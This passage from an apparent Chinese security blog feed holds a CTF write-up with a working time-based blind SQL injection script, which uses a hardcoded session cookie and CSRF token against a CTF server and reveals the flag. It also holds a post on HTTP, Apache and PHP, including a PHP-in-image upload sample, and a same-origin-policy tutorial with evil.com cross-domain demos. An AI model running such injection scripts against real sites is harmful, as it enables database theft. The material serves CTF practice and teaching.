something那里有sql注入</p><p>写个基于时间的盲注脚本，注意需要替换下cookie和csrf_token</p><p>可能昨晚比较夜，比较稳定来着，后面测试貌似有点不稳定，可能要测试几次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">cookies = &#123;&quot;session&quot;:&quot;1cc7cfd5-f3bb-4c18-b966-a9ddbeb54d60&quot;&#125;</span><br><span class="line"></span><br><span class="line">csrf_token = &quot;Ijg2Yjc1ZjhkMzljNzQ3ZDExNzMwYjI4Y2MwYzliMTk3OTBjNDQ1ODMi.DZlTBg.ScINRqfY5Z0acRfUt059ujAM5Ks&quot;</span><br><span class="line"></span><br><span class="line">url = &quot;http://117.50.16.51:20000/index&quot;</span><br><span class="line">proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span><br><span class="line"></span><br><span class="line">def check(url,data):</span><br><span class="line">try:</span><br><span class="line">r = requests.post(url = url,proxies=proxies,data=data,cookies=cookies,timeout=2.5)</span><br><span class="line">except Exception, e:</span><br><span class="line"># print e</span><br><span class="line">return True</span><br><span class="line">return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">while True:</span><br><span class="line">query = raw_input(&quot;&gt; &quot;)</span><br><span class="line"># query = query.replace(&apos; &apos;,&apos;+&apos;)</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">n=1</span><br><span class="line">while True:</span><br><span class="line">flag = False</span><br><span class="line">left  = 0 </span><br><span class="line">right = 127</span><br><span class="line">while True:</span><br><span class="line">mid = (left + right) / 2</span><br><span class="line">print(&quot;l:%d,m:%d,r:%d&quot;%(left,mid,right))</span><br><span class="line">if(mid == 0 or mid == 256):</span><br><span class="line">break</span><br><span class="line">if(mid == left):</span><br><span class="line">result += chr(mid)</span><br><span class="line">flag = True</span><br><span class="line">print &quot;current result is: &quot; + result</span><br><span class="line">break</span><br><span class="line">data = &#123;&quot;csrf_token&quot;:csrf_token</span><br><span class="line">,&quot;post&quot;:&quot;ggtext&apos; or if(ord(mid((%s),%d,1))&lt;%d,sleep(3),1) or &apos;1&apos;=&apos;2&quot;%(query,n,mid),&quot;submit&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">if check(url,data):</span><br><span class="line">right = mid</span><br><span class="line">else:</span><br><span class="line">left = mid</span><br><span class="line"></span><br><span class="line">if(not flag):</span><br><span class="line">break</span><br><span class="line">n += 1</span><br></pre></td></tr></table></figure><p>可以拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QWB&#123;us1ng_val1dator_caut1ous&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>简单理解浏览器_Apache_PHP工作原理</title>
      <link href="//blog/2018/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B5%8F%E8%A7%88%E5%99%A8-Apache-PHP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.html"/>
      <url>//blog/2018/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B5%8F%E8%A7%88%E5%99%A8-Apache-PHP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>被问到一些比较底层的东西，发现自己对于浏览器_Apache_PHP的工作原理了解并不深入，强迫症患者无法忍受。拿比较熟悉的Apache和PHP来开刀。</p><h2 id="浏览器和Apache-Web服务器"><a href="#浏览器和Apache-Web服务器" class="headerlink" title="浏览器和Apache(Web服务器)"></a>浏览器和Apache(Web服务器)</h2><p>浏览器这里代表的是一个发起http/https请求的对象。暂时并不会涉及到浏览器自身的工作原理。</p><p>浏览器和Web服务器的通信是通过HTTP/HTTPS协议的。</p><p>首先，复习下计算机网络里面的HTTP包结构</p><ul><li>请求包</li></ul><p><img src="/img/apache_php/1.jpg" alt=""></p><ul><li>返回包</li></ul><p><img src="/img/apache_php/2.jpg" alt=""></p><h3 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /p.php?name=gaia&amp;id=123 HTTP/1.1</span><br><span class="line">host: myhack.com</span><br></pre></td></tr></table></figure><p><img src="/img/apache_php/3.png" alt=""></p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><ul><li><p>application/x-www-form-urlencoded</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /p.php?name=gaia&amp;id=123 HTTP/1.1</span><br><span class="line">Host: myhack.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 48</span><br><span class="line"></span><br><span class="line">phone=65535&amp;nickname=%E5%88%98%E5%BE%B7%E5%8D%8E</span><br></pre></td></tr></table></figure><p><img src="/img/apache_php/4.png" alt=""></p></li></ul><ul><li><p>multipart/form-data</p><p>PHP会预先把请求体中的文件暂存到临时文件夹，并把参数解析到变量 <code>$_POST</code> 和 <code>$_FILES</code> 中， <code>php://input</code> 获取原始请求的功能也随之失效</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /p.php HTTP/1.1</span><br><span class="line">Host: myhack.com</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 394</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name="phone"</span><br><span class="line"></span><br><span class="line">65534</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name="name"</span><br><span class="line"></span><br><span class="line">gaia</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name="image_file"; filename="copy.jpg"</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br></pre></td></tr></table></figure><p><img src="/img/apache_php/5.png" alt=""></p></li><li><p>application/json</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /p.php HTTP/1.1</span><br><span class="line">Host: myhack.com</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 22</span><br><span class="line"></span><br><span class="line">&#123;"name":"Gaia","id":5&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/apache_php/6.png" alt=""></p></li></ul><h2 id="Apache-和-PHP"><a href="#Apache-和-PHP" class="headerlink" title="Apache 和 PHP"></a>Apache 和 PHP</h2><p>简单介绍三种结合方式</p><blockquote><p>CGI</p><p>FastCGI/fpm</p><p>Module</p><h3 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h3></blockquote><p>CGI(通用网关接口Common Gateway Interface)</p><p>工作方式是，当apache接收到一个请求时，会fork一个进程执行CGI程序，请求传递给CGI程序，即php，php执行完成并返回结果给apache。</p><p>可以看出，php进程不是常驻于内存的，速度慢，被fastcgi模式取代</p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>fastcgi模式是维护了php进程池，保证php进程常驻于内存，加快响应速度。</p><p>php-fpm是一种fastcgi的实现。apache经由模块(如:mod_fastcgi)与php-fpm进行通信，与php-fpm是分离的。</p><h3 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h3><p>Module模式是apache和php默认的结合方式。</p><blockquote><p>phpstudy php5.4.45 </p><p>LoadModule php5_module “php5apache2_4.dll”</p><p>ubuntu 16.04 apt安装</p><p>LoadModule php7_module /usr/lib/apache2/modules/libphp7.0.so</p></blockquote><p>php作为apache的一个模块运行，那么apache和php之间的通信就是进程间的通信了，这种情况下apache和php的权限是一致的。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Web前端基础知识之同源策略</title>
      <link href="//blog/2018/Web%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B9%8B%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5.html"/>
      <url>//blog/2018/Web%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B9%8B%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不同域的客户端脚本在没明确授权的情况下，不能读写对方的资源。</span><br></pre></td></tr></table></figure><h3 id="同域和不同域"><a href="#同域和不同域" class="headerlink" title="同域和不同域"></a>同域和不同域</h3><blockquote><p>同域：同协议、同域名、同端口</p><p>URI scheme、 hostname、 port </p></blockquote><h3 id="同源策略应对的场景"><a href="#同源策略应对的场景" class="headerlink" title="同源策略应对的场景"></a>同源策略应对的场景</h3><blockquote><p>假设场景如下：</p><p>用户A登录了bank.com，然后在没有退出的状态下访问了evil.com。如果没有同源策略，evil.com可以读取bank.com的相关数据，并通过恶意的js来进行任意操作。</p><p>举个例子</p><p><a href="http://evil.com/index.php" target="_blank" rel="noopener">http://evil.com/index.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;!DOCTYPE html&gt;</span><br><span class="line">&gt; &lt;html&gt;</span><br><span class="line">&gt; &lt;head&gt;</span><br><span class="line">&gt; &lt;title&gt;evil&lt;/title&gt;</span><br><span class="line">&gt; &lt;/head&gt;</span><br><span class="line">&gt; &lt;body&gt;</span><br><span class="line">&gt;   &lt;script&gt;</span><br><span class="line">&gt;   e = document.createElement(<span class="string">'iframe'</span>);e.src=<span class="string">"http://bank.com/index.php"</span>;document.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(e);</span><br><span class="line">&gt;   alert(e.innerHtml);</span><br><span class="line">&gt;   &lt;/script&gt;</span><br><span class="line">&gt; hello world</span><br><span class="line">&gt; &lt;/body&gt;</span><br><span class="line">&gt; &lt;/html&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>尝试跨域访问<a href="http://bank.com/index.php中的内容，可以看见内容，但是不能通过js访问和操作。" target="_blank" rel="noopener">http://bank.com/index.php中的内容，可以看见内容，但是不能通过js访问和操作。</a></p><p><img src="/img/front/1537609155239.png" alt="1537609155239"></p></blockquote><h3 id="如何才能授权访问？（跨源策略）"><a href="#如何才能授权访问？（跨源策略）" class="headerlink" title="如何才能授权访问？（跨源策略）"></a>如何才能授权访问？（跨源策略）</h3><h4 id="1-通过document-domain跨子域"><a href="#1-通过document-domain跨子域" class="headerlink" title="1. 通过document.domain跨子域"></a>1. 通过document.domain跨子域</h4><blockquote><p>适用范围：</p><ol><li>协议和端口相同，相同的父域名(如：<a href="http://about.bank.com" target="_blank" rel="noopener">http://about.bank.com</a> 和 <a href="http://bank.com" target="_blank" rel="noopener">http://bank.com</a>)</li><li>iframe窗口和父窗口之间互相获取cookie和DOM节点信息</li></ol><p>示例：<br><a href="http://about.bank.com中" target="_blank" rel="noopener">http://about.bank.com中</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.domain = <span class="string">'bank.com'</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><a href="http://bank.com中" target="_blank" rel="noopener">http://bank.com中</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">document</span>.domain = <span class="string">'bank.com'</span>;</span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">&gt; ifr.src =  <span class="string">'http://about.bank.com/'</span>;  </span></span><br><span class="line"><span class="javascript">&gt; ifr.display = <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">document</span>.body.appendChild(ifr);</span></span><br><span class="line"><span class="javascript">&gt; ifr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span></span><br><span class="line"><span class="javascript">&gt;     <span class="keyword">var</span> doc = ifr.contentDocument || ifr.contentWindow.document;                                                          </span></span><br><span class="line"><span class="javascript">&gt;     ifr.onload = <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">&gt;     <span class="built_in">console</span>.log(doc);</span></span><br><span class="line"><span class="undefined">&gt; &#125;;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/front/1537612032054.png" alt="1537612032054"></p><p>可以看到完全可以访问，因为这时候已经不存在跨域问题了。</p><p>同理，<a href="http://about.bank.com中访问http://bank.com也是可以的。" target="_blank" rel="noopener">http://about.bank.com中访问http://bank.com也是可以的。</a></p></blockquote><h4 id="2-通过location-hash跨域"><a href="#2-通过location-hash跨域" class="headerlink" title="2. 通过location.hash跨域"></a>2. 通过location.hash跨域</h4><blockquote><p>适用范围：</p><ol><li>可以实现完全不同域的跨域</li><li>可以双向通信</li></ol><p>‘<a href="http://bank.com/index.php#123456" target="_blank" rel="noopener">http://bank.com/index.php#123456</a>‘</p><p>则<code>location.hash</code>为<code>#123456</code></p><p><a href="http://evil.com/index.php" target="_blank" rel="noopener">http://evil.com/index.php</a> 添加iframe，并通过设置src的hash部分来传递信息，然后轮询获取hash信息。(或通过html5中的onhashchange事件)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">&gt; iframe.style.display = <span class="string">'none'</span>;</span></span><br><span class="line"><span class="javascript">&gt; iframe.src = <span class="string">"http://bank.com/index.php#hello"</span>;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript">&gt; <span class="function"><span class="keyword">function</span> <span class="title">checkHash</span>(<span class="params"></span>) </span>&#123;  </span></span><br><span class="line"><span class="javascript">&gt;     <span class="keyword">try</span> &#123;  </span></span><br><span class="line"><span class="javascript">&gt;         <span class="keyword">var</span> data = location.hash ? location.hash.substring(<span class="number">1</span>) : <span class="string">''</span>;  </span></span><br><span class="line"><span class="javascript">&gt;         <span class="keyword">if</span> (<span class="built_in">console</span>.log) &#123;  </span></span><br><span class="line"><span class="javascript">&gt;             <span class="built_in">console</span>.log(<span class="string">'Now the data is '</span>+data);  </span></span><br><span class="line"><span class="undefined">&gt;         &#125;  </span></span><br><span class="line"><span class="javascript">&gt;     &#125; <span class="keyword">catch</span>(e) &#123;&#125;;  </span></span><br><span class="line"><span class="undefined">&gt; &#125;  </span></span><br><span class="line"><span class="undefined">&gt; setInterval(checkHash, 1000);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; hello world</span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><a href="http://bank.com/index.php" target="_blank" rel="noopener">http://bank.com/index.php</a> 接收信息，并通过设置<code>parent.location.hash</code>(chrome、ie不支持，由于同源策略)或用一个<code>http://evil.com/index2.php</code>来中转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="function"><span class="keyword">function</span> <span class="title">callBack</span>(<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="javascript">&gt;     <span class="keyword">try</span> &#123;  </span></span><br><span class="line"><span class="javascript">&gt;         parent.location.hash = <span class="string">'#world'</span>;  </span></span><br><span class="line"><span class="javascript">&gt;     &#125; <span class="keyword">catch</span> (e) &#123; </span></span><br><span class="line"><span class="javascript">&gt;         <span class="keyword">var</span> ifrproxy = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);  </span></span><br><span class="line"><span class="javascript">&gt;         ifrproxy.style.display = <span class="string">'none'</span>;  </span></span><br><span class="line"><span class="javascript">&gt;         ifrproxy.src = <span class="string">'http://evil.com/index2.php#world'</span>; </span></span><br><span class="line"><span class="javascript">&gt;         <span class="built_in">document</span>.body.appendChild(ifrproxy);  </span></span><br><span class="line"><span class="undefined">&gt;     &#125;  </span></span><br><span class="line"><span class="undefined">&gt; &#125;  </span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">switch</span>(location.hash)&#123;</span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">case</span> <span class="string">'#hello'</span>:</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="string">"hello"</span>);</span></span><br><span class="line"><span class="undefined">&gt; callBack();</span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">&gt; &#125;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><a href="http://evil.com/index2.php" target="_blank" rel="noopener">http://evil.com/index2.php</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; parent.parent.location.hash = <span class="string">"#world"</span>;</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="3-通过window-name跨域"><a href="#3-通过window-name跨域" class="headerlink" title="3. 通过window.name跨域"></a>3. 通过window.name跨域</h4><blockquote><p>window.name有一个特性，在一个window的生命周期中，name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的 name 值（2MB）</p><p>那么，可以在<code>http://evil.com</code>，创建一个<code>iframe</code>指向<code>http://bank.com</code>，在bank.com中，设置<code>window.name</code>为要传递的信息，然后，跳转到一个跟<code>http://evil.com</code>同域的页面，此时，父窗口即可访问子窗口的<code>window.name</code>。</p><p>‘<a href="http://evil.com/index.php" target="_blank" rel="noopener">http://evil.com/index.php</a>‘</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">&gt; <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">&gt; iframe.style.display = <span class="string">'none'</span>;</span></span><br><span class="line"><span class="javascript">&gt; iframe.src = <span class="string">"http://bank.com/index.php"</span>;</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">console</span>.log(<span class="built_in">window</span>.name);</span></span><br><span class="line"><span class="javascript">&gt; <span class="built_in">window</span>.name=<span class="string">"hello"</span>;</span></span><br><span class="line"><span class="undefined">&gt; </span></span><br><span class="line"><span class="javascript">&gt; setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="string">"bank "</span> + iframe.contentWindow.name);&#125;,<span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined">&gt; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt; hello world</span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt; <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>‘<a href="http://bank.com/index.php" target="_blank" rel="noopener">http://bank.com/index.php</a>‘</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt; <span 